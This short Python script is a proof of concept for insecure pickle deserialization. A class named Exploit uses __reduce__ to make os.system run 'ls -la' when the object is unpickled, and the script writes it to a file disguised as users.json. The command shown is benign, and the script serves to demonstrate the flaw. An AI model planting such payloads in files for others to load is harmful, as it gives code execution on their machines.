import os
import pickle

class Exploit():
    def __reduce__(self):
        return(os.system,('ls -la',))
def serialize_exploit():      
    name = {"username":"name","password":"password"}      
    f = open("users.json","wb")      
    safecode = pickle.dump(Exploit(),f)      
    return safecode
if __name__ == '__main__':      
   # u = "Sainya"
   # p = "Ranakshetam"
    safecode = serialize_exploit()
